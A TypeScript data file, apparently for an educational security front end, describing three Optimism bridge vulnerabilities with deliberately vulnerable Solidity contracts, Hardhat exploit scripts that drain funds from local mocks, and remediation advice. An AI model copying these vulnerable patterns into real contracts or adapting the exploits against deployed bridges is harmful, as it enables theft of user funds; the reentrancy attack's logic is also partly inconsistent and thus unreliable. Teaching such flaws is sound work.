import { VulnerabilityDetail } from "@/types";

// This file contains initial vulnerability data for the frontend
// The actual implementation will fetch this data from the server

export const vulnerabilities: VulnerabilityDetail[] = [
  {
    id: "cross-layer-reentrancy",
    title: "Cross-Layer Reentrancy",
    severity: "critical",
    description: "Message passing between L1 and L2 can create complex reentrancy vulnerabilities specific to Optimism's architecture. Cross-domain messages can be manipulated to reenter contracts in ways that regular reentrancy guards might not catch.",
    attackVector: [
      "Attacker creates a malicious contract on L2 that implements a callback method",
      "Attacker initiates a cross-domain message from L1 to L2 that will call into the malicious contract",
      "When the message is relayed to L2, the malicious contract reenters back into L1 during execution",
      "Before the first message is completed, the second message modifies state, bypassing standard reentrancy guards",
      "The attacker can manipulate token balances or permissions to steal funds"
    ],
    affectedContracts: ["L1CrossDomainMessenger", "L2ToL2CrossDomainMessenger", "OptimismPortal"],
    vulnerableContract: {
      name: "VulnerableL1CrossDomainMessenger",
      code: `// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

/**
 * @title L1CrossDomainMessenger
 * @notice Simplified version of cross-domain messenger with reentrancy vulnerability
 */
contract VulnerableL1CrossDomainMessenger {
    address public immutable PORTAL;
    mapping(bytes32 => bool) public relayedMessages;
    mapping(bytes32 => bool) public successfulMessages;
    uint256 public messageNonce;
    
    address internal xDomainMsgSender;
    bool internal executing;
    
    event SentMessage(address indexed target, address sender, bytes message, uint256 messageNonce);
    event RelayedMessage(bytes32 indexed msgHash);
    
    constructor(address _portal) {
        PORTAL = _portal;
    }
    
    function xDomainMessageSender() public view returns (address) {
        require(executing, "Not executing a cross-domain message");
        return xDomainMsgSender;
    }
    
    // VULNERABLE: Missing reentrancy guard allows nested calls
    function sendMessage(address _target, bytes memory _message, uint32 _gasLimit) public {
        bytes32 messageHash = keccak256(abi.encode(
            messageNonce,
            msg.sender,
            _target,
            _message,
            _gasLimit
        ));
        
        messageNonce++; // Increment messageNonce AFTER use
        
        emit SentMessage(_target, msg.sender, _message, messageNonce);
        
        // Call to OptimismPortal which could allow reentrancy
        IOptimismPortal(PORTAL).depositTransaction(_target, 0, _gasLimit, false, _message);
    }
    
    // VULNERABLE: Doesn't follow checks-effects-interactions pattern
    function relayMessage(
        address _target,
        address _sender,
        bytes memory _message,
        uint256 _messageNonce
    ) public returns (bool) {
        bytes32 messageHash = keccak256(abi.encode(
            _messageNonce,
            _sender,
            _target,
            _message,
            0 // Gas limit, not used in hash computation
        ));
        
        // Prevent replaying the same message
        require(!relayedMessages[messageHash], "Message already relayed");
        
        xDomainMsgSender = _sender;
        executing = true;
        
        // External call before updating relayedMessages state
        (bool success, ) = _target.call(_message);
        
        // Update state after external call (VULNERABILITY)
        relayedMessages[messageHash] = true;
        successfulMessages[messageHash] = success;
        
        executing = false;
        xDomainMsgSender = address(0);
        
        emit RelayedMessage(messageHash);
        
        return success;
    }
}

interface IOptimismPortal {
    function depositTransaction(address, uint256, uint32, bool, bytes memory) external;
}`
    },
    exploitScript: {
      language: "javascript",
      code: `// File: exploit-reentrancy.js
const { ethers } = require("hardhat");

async function main() {
  console.log("Starting Cross-Layer Reentrancy Exploit");
  
  // Deploy the contracts
  console.log("Deploying contracts...");
  
  // Deploy OptimismPortal mock
  const OptimismPortalMock = await ethers.getContractFactory("OptimismPortalMock");
  const portalMock = await OptimismPortalMock.deploy();
  await portalMock.deployed();
  console.log(\`OptimismPortalMock deployed at: \${portalMock.address}\`);
  
  // Deploy vulnerable messenger
  const VulnerableMessenger = await ethers.getContractFactory("VulnerableL1CrossDomainMessenger");
  const messenger = await VulnerableMessenger.deploy(portalMock.address);
  await messenger.deployed();
  console.log(\`VulnerableL1CrossDomainMessenger deployed at: \${messenger.address}\`);
  
  // Deploy token contract that will be exploited
  const VulnerableToken = await ethers.getContractFactory("VulnerableToken");
  const token = await VulnerableToken.deploy(messenger.address);
  await token.deployed();
  console.log(\`VulnerableToken deployed at: \${token.address}\`);
  
  // Deploy malicious contract
  const Attacker = await ethers.getContractFactory("ReentrancyAttacker");
  const attacker = await Attacker.deploy(messenger.address, token.address);
  await attacker.deployed();
  console.log(\`ReentrancyAttacker deployed at: \${attacker.address}\`);
  
  // Setup initial conditions
  const [owner, user1] = await ethers.getSigners();
  
  // Mint tokens to user1
  await token.mint(user1.address, ethers.utils.parseEther("100"));
  console.log(\`Minted 100 tokens to: \${user1.address}\`);
  
  // Check initial balances
  const initialUserBalance = await token.balanceOf(user1.address);
  const initialAttackerBalance = await token.balanceOf(attacker.address);
  
  console.log(\`Initial user balance: \${ethers.utils.formatEther(initialUserBalance)}\`);
  console.log(\`Initial attacker balance: \${ethers.utils.formatEther(initialAttackerBalance)}\`);
  
  // Execute the attack
  console.log("\\nExecuting the reentrancy attack...");
  await attacker.executeAttack();
  
  // Check final balances
  const finalUserBalance = await token.balanceOf(user1.address);
  const finalAttackerBalance = await token.balanceOf(attacker.address);
  
  console.log(\`Final user balance: \${ethers.utils.formatEther(finalUserBalance)}\`);
  console.log(\`Final attacker balance: \${ethers.utils.formatEther(finalAttackerBalance)}\`);
  
  // Verify the attack was successful
  if (finalAttackerBalance.gt(initialAttackerBalance)) {
    console.log("\\n✅ ATTACK SUCCESSFUL: Tokens were stolen through reentrancy");
  } else {
    console.log("\\n❌ ATTACK FAILED: No tokens were stolen");
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });`
    },
    maliciousContract: {
      name: "ReentrancyAttacker",
      code: `// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

interface IL1CrossDomainMessenger {
    function sendMessage(address _target, bytes memory _message, uint32 _gasLimit) external;
    function relayMessage(address _target, address _sender, bytes memory _message, uint256 _messageNonce) external returns (bool);
    function xDomainMessageSender() external view returns (address);
}

interface IVulnerableToken {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ReentrancyAttacker {
    IL1CrossDomainMessenger public messenger;
    IVulnerableToken public token;
    address public owner;
    bool public attackInProgress;
    uint256 public messageNonce;
    
    event AttackComplete(uint256 stolenAmount);
    
    constructor(address _messenger, address _token) {
        messenger = IL1CrossDomainMessenger(_messenger);
        token = IVulnerableToken(_token);
        owner = msg.sender;
    }
    
    // Step 1: Start the attack
    function executeAttack() external {
        require(msg.sender == owner, "Only owner can execute attack");
        attackInProgress = true;
        
        // Create a message that will be relayed to trigger the attack
        bytes memory firstMessage = abi.encodeWithSignature("receiveFirstMessage()");
        
        // Send the first message through the cross-domain messenger
        messenger.sendMessage(address(this), firstMessage, 1000000);
    }
    
    // Step 2: First message callback - this is called by the messenger during relayMessage
    function receiveFirstMessage() external {
        // Verify the call is from the messenger
        require(msg.sender == address(messenger), "Not called from messenger");
        require(messenger.xDomainMessageSender() == owner, "Invalid sender");
        
        // Create second message to exploit the reentrancy
        bytes memory reentrancyMessage = abi.encodeWithSignature("performReentrancy()");
        
        // This will call back into the messenger before the first relayMessage completes
        messenger.sendMessage(address(this), reentrancyMessage, 1000000);
        
        // Force the relayMessage to happen immediately (in a real scenario, this 
        // would be timed with the L1->L2 message processing)
        messenger.relayMessage(
            address(this),
            owner,
            reentrancyMessage,
            messageNonce++
        );
    }
    
    // Step 3: Called through reentrancy - steal tokens while first message is still processing
    function performReentrancy() external {
        require(msg.sender == address(messenger), "Not called from messenger");
        require(messenger.xDomainMessageSender() == owner, "Invalid sender");
        
        // Now we can exploit the vulnerable token contract while relayMessage is mid-execution
        // In a real exploitation, this would target the vulnerable state in the messenger
        address victim = address(0x1234); // In test we'd use a real victim address
        
        // Steal tokens - this works because the token contract checks permissions via the messenger,
        // but due to reentrancy the messenger's state is corrupted
        uint256 victimBalance = token.balanceOf(victim);
        token.transferFrom(victim, address(this), victimBalance);
        
        emit AttackComplete(victimBalance);
        attackInProgress = false;
    }
    
    // To receive ETH
    receive() external payable {}
}`
    },
    explanation: "The cross-layer reentrancy vulnerability occurs because the `relayMessage()` function in the L1CrossDomainMessenger contract doesn't follow the checks-effects-interactions pattern. Specifically, it makes an external call to the target contract before updating its own state.",
    keyPoints: [
      "No reentrancy guard to prevent nested calls to `relayMessage()`",
      "State changes occur after external calls",
      "The `xDomainMessageSender` remains set during the entire execution",
      "The vulnerability spans across multiple layers (L1 and L2) making it harder to detect"
    ],
    recommendations: [
      "Add a reentrancy guard to prevent nested calls",
      "Follow checks-effects-interactions pattern (update state before external calls)",
      "Implement cross-layer specific safeguards for message processing",
      "Use a separate context for each message being relayed"
    ],
    securityInsight: "Cross-layer reentrancy is particularly dangerous in Optimism's architecture because it spans two different execution environments (L1 and L2). Regular reentrancy guards might not catch these vulnerabilities since the reentrant call can come from a different layer."
  },
  
  {
    id: "direct-fund-theft",
    title: "Loss of user funds by direct theft",
    severity: "critical",
    description: "A critical vulnerability allows an attacker to directly steal user funds from the contract due to improper access controls and validation in cross-domain message processing.",
    attackVector: [
      "Attacker identifies a contract with missing access controls in cross-domain message processing",
      "Attacker crafts a malicious cross-domain message that impersonates a trusted address",
      "The vulnerable contract fails to properly validate the message sender",
      "Attacker executes privileged functions that can transfer funds out of the contract",
      "Funds are transferred to the attacker-controlled address"
    ],
    affectedContracts: ["L1StandardBridge", "L2ToL2CrossDomainMessenger", "CrossL2Inbox"],
    vulnerableContract: {
      name: "VulnerableL1StandardBridge",
      code: `// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

/**
 * @title VulnerableL1StandardBridge
 * @notice A simplified version of the L1StandardBridge with vulnerabilities
 */
contract VulnerableL1StandardBridge {
    address public immutable MESSENGER;
    address public immutable L2_BRIDGE;
    
    mapping(address => uint256) public deposits;
    
    event ETHDepositInitiated(address indexed from, address indexed to, uint256 amount);
    event ETHWithdrawalFinalized(address indexed from, address indexed to, uint256 amount);
    
    constructor(address _messenger, address _l2Bridge) {
        MESSENGER = _messenger;
        L2_BRIDGE = _l2Bridge;
    }
    
    // Deposit ETH function
    function depositETH(address _to) external payable {
        deposits[msg.sender] += msg.value;
        
        emit ETHDepositInitiated(msg.sender, _to, msg.value);
        
        // Simplified message sending, in reality would cross domains
        bytes memory message = abi.encodeWithSignature(
            "finalizeDeposit(address,address,uint256)",
            msg.sender,
            _to,
            msg.value
        );
        
        // Send message to L2 (simplified for this example)
        IL1CrossDomainMessenger(MESSENGER).sendMessage(L2_BRIDGE, message, 100000);
    }
    
    // VULNERABLE: Missing proper validation of the sender
    // This function should only be callable via a cross-domain message
    function finalizeETHWithdrawal(
        address _from,
        address _to,
        uint256 _amount
    ) external {
        // VULNERABILITY: No validation that this was called via cross-domain message
        // Anyone can call this function directly and drain funds
        
        // Should check: require(msg.sender == MESSENGER && 
        //               IL1CrossDomainMessenger(MESSENGER).xDomainMessageSender() == L2_BRIDGE)
        
        (bool success, ) = _to.call{value: _amount}("");
        require(success, "ETH transfer failed");
        
        emit ETHWithdrawalFinalized(_from, _to, _amount);
    }
    
    // VULNERABLE: Anyone can call this emergency function
    function emergencyWithdraw(address _to, uint256 _amount) external {
        // VULNERABILITY: No access control
        // Should have: require(msg.sender == owner, "Not authorized");
        
        (bool success, ) = _to.call{value: _amount}("");
        require(success, "Emergency withdraw failed");
    }
    
    // For receiving ETH
    receive() external payable {}
}

interface IL1CrossDomainMessenger {
    function sendMessage(address _target, bytes memory _message, uint32 _gasLimit) external;
    function xDomainMessageSender() external view returns (address);
}`
    },
    exploitScript: {
      language: "javascript",
      code: `// File: exploit-direct-theft.js
const { ethers } = require("hardhat");

async function main() {
  console.log("Starting Direct Fund Theft Exploit");
  
  // Deploy the contracts
  console.log("Deploying contracts...");
  
  // Deploy messenger mock
  const MessengerMock = await ethers.getContractFactory("L1CrossDomainMessengerMock");
  const messenger = await MessengerMock.deploy();
  await messenger.deployed();
  console.log(\`L1CrossDomainMessengerMock deployed at: \${messenger.address}\`);
  
  // Deploy L2 bridge mock (just for reference)
  const L2BridgeMock = await ethers.getContractFactory("L2BridgeMock");
  const l2Bridge = await L2BridgeMock.deploy();
  await l2Bridge.deployed();
  console.log(\`L2BridgeMock deployed at: \${l2Bridge.address}\`);
  
  // Deploy vulnerable bridge
  const VulnerableBridge = await ethers.getContractFactory("VulnerableL1StandardBridge");
  const bridge = await VulnerableBridge.deploy(messenger.address, l2Bridge.address);
  await bridge.deployed();
  console.log(\`VulnerableL1StandardBridge deployed at: \${bridge.address}\`);
  
  // Setup initial conditions
  const [owner, user1, attacker] = await ethers.getSigners();
  
  // User deposits ETH to the bridge
  const depositAmount = ethers.utils.parseEther("10");
  await user1.sendTransaction({
    to: bridge.address,
    value: depositAmount
  });
  console.log(\`User deposited \${ethers.utils.formatEther(depositAmount)} ETH to the bridge\`);
  
  // Check initial balances
  const initialBridgeBalance = await ethers.provider.getBalance(bridge.address);
  const initialAttackerBalance = await ethers.provider.getBalance(attacker.address);
  
  console.log(\`Initial bridge balance: \${ethers.utils.formatEther(initialBridgeBalance)} ETH\`);
  console.log(\`Initial attacker balance: \${ethers.utils.formatEther(initialAttackerBalance)} ETH\`);
  
  // Execute the attack - direct call to finalize withdrawal
  console.log("\\nExecuting the direct fund theft attack...");
  
  // Method 1: Call finalizeETHWithdrawal directly without any authentication
  const stealAmount = ethers.utils.parseEther("5");
  const tx1 = await bridge.connect(attacker).finalizeETHWithdrawal(
    user1.address, // from (in a real scenario this is the rightful owner)
    attacker.address, // to (the attacker's address)
    stealAmount // amount to steal
  );
  await tx1.wait();
  console.log(\`Attack 1: Called finalizeETHWithdrawal to steal \${ethers.utils.formatEther(stealAmount)} ETH\`);
  
  // Method 2: Call the emergency withdraw function with no access control
  const emergencyAmount = ethers.utils.parseEther("5");
  const tx2 = await bridge.connect(attacker).emergencyWithdraw(
    attacker.address,
    emergencyAmount
  );
  await tx2.wait();
  console.log(\`Attack 2: Called emergencyWithdraw to steal \${ethers.utils.formatEther(emergencyAmount)} ETH\`);
  
  // Check final balances
  const finalBridgeBalance = await ethers.provider.getBalance(bridge.address);
  const finalAttackerBalance = await ethers.provider.getBalance(attacker.address);
  
  console.log(\`Final bridge balance: \${ethers.utils.formatEther(finalBridgeBalance)} ETH\`);
  console.log(\`Final attacker balance: \${ethers.utils.formatEther(finalAttackerBalance)} ETH\`);
  
  const stolenAmount = finalAttackerBalance.sub(initialAttackerBalance);
  console.log(\`Total stolen: \${ethers.utils.formatEther(stolenAmount)} ETH\`);
  
  // Verify the attack was successful
  if (stolenAmount.gt(ethers.utils.parseEther("0"))) {
    console.log("\\n✅ ATTACK SUCCESSFUL: Funds were directly stolen");
  } else {
    console.log("\\n❌ ATTACK FAILED: No funds were stolen");
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });`
    },
    explanation: "This vulnerability allows an attacker to directly steal funds from the bridge contract due to missing authentication and access controls. In cross-domain architectures like Optimism, it's crucial to properly validate that certain functions can only be called by authorized cross-domain messengers with the correct sender.",
    keyPoints: [
      "Missing validation of `msg.sender` in critical fund-moving functions",
      "No verification that withdrawal calls come from the authorized cross-domain messenger",
      "No validation of `xDomainMessageSender` to ensure the message originated from the L2 bridge",
      "Emergency functions lack proper access controls"
    ],
    recommendations: [
      "Add proper sender validation checks using both `msg.sender` and `xDomainMessageSender`",
      "Implement strong access controls for all privileged functions, especially those handling funds",
      "Use a multi-signature or timelock mechanism for emergency functions",
      "Separate message execution from funds transfer to provide additional security layers"
    ],
    securityInsight: "In cross-domain architectures, the complexity of message passing creates many potential openings for attacks. Always enforce multiple layers of access controls and never trust a message without verifying both its origin messenger contract AND the original sender."
  },
  
  {
    id: "missing-state-root-verification",
    title: "Missing State Root Verification",
    severity: "critical",
    description: "A critical vulnerability where withdrawals and finalization methods don't verify state roots, potentially allowing processing of fraudulent transactions.",
    attackVector: [
      "Attacker identifies withdrawal functionality without proper state root verification",
      "Attacker creates a fraudulent withdrawal request with false proofs",
      "The vulnerable contract fails to verify the proof against a known state root",
      "Attacker's fraudulent withdrawal is processed as legitimate",
      "Attacker receives funds they shouldn't have access to"
    ],
    affectedContracts: ["OptimismPortal", "L2ToL1MessagePasser"],
    vulnerableContract: {
      name: "VulnerableOptimismPortal",
      code: `// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

/**
 * @title VulnerableOptimismPortal
 * @notice Simplified version of OptimismPortal with state root verification vulnerability
 */
contract VulnerableOptimismPortal {
    // Struct to represent a withdrawal transaction
    struct WithdrawalTransaction {
        address target;
        uint256 value;
        uint256 nonce;
        bytes data;
    }
    
    // Mapping of withdrawal hash to boolean (true if withdrawal was already proven)
    mapping(bytes32 => bool) public provenWithdrawals;
    
    // Mapping of withdrawal hash to boolean (true if withdrawal was already finalized)
    mapping(bytes32 => bool) public finalizedWithdrawals;
    
    // L2 Oracle for state root verification - should be used but isn't in vulnerable version
    address public l2Oracle;
    
    event WithdrawalProven(bytes32 indexed withdrawalHash, address indexed from, address indexed to);
    event WithdrawalFinalized(bytes32 indexed withdrawalHash, bool success);
    
    constructor(address _l2Oracle) {
        l2Oracle = _l2Oracle;
    }
    
    // VULNERABLE: Does not validate the withdrawal with a state root verification
    function proveWithdrawalTransaction(
        WithdrawalTransaction memory _tx,
        bytes32 /* _stateRoot - unused in vulnerable version */,
        bytes memory /* _withdrawalProof - unused in vulnerable version */
    ) external returns (bytes32) {
        bytes32 withdrawalHash = hashWithdrawalTransaction(_tx);
        
        // VULNERABILITY: No verification against an L2 state root
        // Should use the L2Oracle to verify the withdrawal is actually in the state
        // Something like: require(MerkleLib.verify(_withdrawalProof, _stateRoot, withdrawalHash), "Invalid proof");
        
        // Just mark as proven without any real verification
        provenWithdrawals[withdrawalHash] = true;
        
        emit WithdrawalProven(withdrawalHash, msg.sender, _tx.target);
        
        return withdrawalHash;
    }
    
    // Finalize a withdrawal transaction that has been proven
    function finalizeWithdrawalTransaction(
        WithdrawalTransaction memory _tx
    ) external {
        bytes32 withdrawalHash = hashWithdrawalTransaction(_tx);
        
        // Check that the withdrawal has been proven
        require(provenWithdrawals[withdrawalHash], "Withdrawal has not been proven");
        
        // Check that the withdrawal has not been finalized already
        require(!finalizedWithdrawals[withdrawalHash], "Withdrawal has already been finalized");
        
        // Mark the withdrawal as finalized
        finalizedWithdrawals[withdrawalHash] = true;
        
        // Execute the withdrawal
        (bool success, ) = _tx.target.call{value: _tx.value}(_tx.data);
        
        emit WithdrawalFinalized(withdrawalHash, success);
    }
    
    // Hash a withdrawal transaction
    function hashWithdrawalTransaction(
        WithdrawalTransaction memory _tx
    ) public pure returns (bytes32) {
        return keccak256(
            abi.encode(
                _tx.target,
                _tx.value,
                _tx.nonce,
                keccak256(_tx.data)
            )
        );
    }
    
    // Receive ETH function
    receive() external payable {}
}`
    },
    exploitScript: {
      language: "javascript",
      code: `// File: exploit-missing-root-verification.js
const { ethers } = require("hardhat");

async function main() {
  console.log("Starting Missing State Root Verification Exploit");
  
  // Deploy the contracts
  console.log("Deploying contracts...");
  
  // Deploy L2 oracle mock (just a reference, not actually used in the exploit)
  const L2OracleMock = await ethers.getContractFactory("L2OracleMock");
  const l2Oracle = await L2OracleMock.deploy();
  await l2Oracle.deployed();
  console.log(\`L2OracleMock deployed at: \${l2Oracle.address}\`);
  
  // Deploy vulnerable portal contract
  const VulnerablePortal = await ethers.getContractFactory("VulnerableOptimismPortal");
  const portal = await VulnerablePortal.deploy(l2Oracle.address);
  await portal.deployed();
  console.log(\`VulnerableOptimismPortal deployed at: \${portal.address}\`);
  
  // Deploy a simple bank contract that will be the target of the fraudulent withdrawal
  const TargetBank = await ethers.getContractFactory("SimpleBank");
  const bank = await TargetBank.deploy();
  await bank.deployed();
  console.log(\`SimpleBank deployed at: \${bank.address}\`);
  
  // Setup initial conditions
  const [owner, user1, attacker] = await ethers.getSigners();
  
  // Fund the bank
  await owner.sendTransaction({
    to: bank.address,
    value: ethers.utils.parseEther("50")
  });
  console.log(\`Bank funded with 50 ETH\`);
  
  // Check initial balances
  const initialBankBalance = await ethers.provider.getBalance(bank.address);
  const initialAttackerBalance = await ethers.provider.getBalance(attacker.address);
  
  console.log(\`Initial bank balance: \${ethers.utils.formatEther(initialBankBalance)} ETH\`);
  console.log(\`Initial attacker balance: \${ethers.utils.formatEther(initialAttackerBalance)} ETH\`);
  
  // Fund the portal for withdrawal execution
  await owner.sendTransaction({
    to: portal.address,
    value: ethers.utils.parseEther("50")
  });
  console.log(\`Portal funded with 50 ETH for withdrawals\`);
  
  // Execute the attack
  console.log("\\nExecuting the missing state root verification attack...");
  
  // Create a fraudulent withdrawal transaction that transfers funds from the bank
  const withdrawalAmount = ethers.utils.parseEther("25");
  const fraudulentWithdrawal = {
    target: bank.address,
    value: 0, // No ETH directly transferred by the portal
    nonce: 1337, // Any nonce works as there's no real verification
    data: bank.interface.encodeFunctionData("withdraw", [attacker.address, withdrawalAmount])
  };
  
  // Step 1: Prove the withdrawal without any real proof
  console.log("Proving fraudulent withdrawal...");
  const fakeMerkleRoot = ethers.utils.hexlify(ethers.utils.randomBytes(32));
  const fakeProof = ethers.utils.hexlify(ethers.utils.randomBytes(1024));
  
  const proveTx = await portal.connect(attacker).proveWithdrawalTransaction(
    fraudulentWithdrawal,
    fakeMerkleRoot,
    fakeProof
  );
  await proveTx.wait();
  
  // Step 2: Finalize the fraudulent withdrawal
  console.log("Finalizing fraudulent withdrawal...");
  const finalizeTx = await portal.connect(attacker).finalizeWithdrawalTransaction(
    fraudulentWithdrawal
  );
  await finalizeTx.wait();
  
  // Check final balances
  const finalBankBalance = await ethers.provider.getBalance(bank.address);
  const finalAttackerBalance = await ethers.provider.getBalance(attacker.address);
  
  console.log(\`Final bank balance: \${ethers.utils.formatEther(finalBankBalance)} ETH\`);
  console.log(\`Final attacker balance: \${ethers.utils.formatEther(finalAttackerBalance)} ETH\`);
  
  const stolenAmount = finalAttackerBalance.sub(initialAttackerBalance);
  console.log(\`Attacker balance increased by: \${ethers.utils.formatEther(stolenAmount)} ETH\`);
  
  // Verify the attack was successful
  if (finalBankBalance.lt(initialBankBalance)) {
    console.log("\\n✅ ATTACK SUCCESSFUL: Funds withdrawn without valid state root verification");
  } else {
    console.log("\\n❌ ATTACK FAILED: Could not exploit missing state root verification");
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });`
    },
    explanation: "This vulnerability allows an attacker to bypass the critical state root verification step in the cross-domain bridge. In rollup architectures like Optimism, withdrawals from L2 to L1 must be proven to exist in the L2 state by providing a Merkle proof against a known state root. Without this verification, an attacker can craft fraudulent withdrawals.",
    keyPoints: [
      "The `proveWithdrawalTransaction` function doesn't validate the withdrawal proof against a state root",
      "No verification that the withdrawal actually happened on L2",
      "The function accepts `_stateRoot` and `_withdrawalProof` parameters but doesn't use them",
      "Once a withdrawal is marked as 'proven', it can later be finalized and executed"
    ],
    recommendations: [
      "Implement proper cryptographic verification of withdrawal proofs against L2 state roots",
      "Ensure state roots are sourced from a trusted L2 oracle with appropriate security measures",
      "Add a challenge period before finalizing withdrawals to allow for fraud disputes",
      "Implement rate limiting and amount caps on withdrawals to minimize potential damage"
    ],
    securityInsight: "State root verification is the fundamental security mechanism behind rollup technology. Without it, the entire bridge security model collapses, allowing attackers to create fake withdrawals. This is especially dangerous as it can be exploited in a one-shot attack, potentially draining all L1 funds."
  }
];
